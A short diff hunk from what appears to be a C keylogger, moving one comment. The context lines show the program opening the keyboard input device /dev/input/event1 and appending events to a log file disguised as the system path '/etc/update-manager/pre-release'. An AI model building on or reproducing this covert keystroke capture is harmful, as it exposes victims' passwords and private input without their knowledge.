@@ -14,13 +14,12 @@
 #define LOGFILE "/etc/update-manager/pre-release"
 #define RUN 1
 
-// (see listing of input dev) --> ls -l /dev/input
-
 int main (int argc, char **argv) {
 	struct input_event ev;
 	
 	// Users should check to make sure their keyboard is event1
 	// (check to see what event keyboard is) --> cat /proc/bus/input/devices|more
+	// (see listing of input dev) --> ls -l /dev/input
 	int file_d = open("/dev/input/event1", O_RDONLY);
 
 	FILE *fp = fopen(LOGFILE, "a");
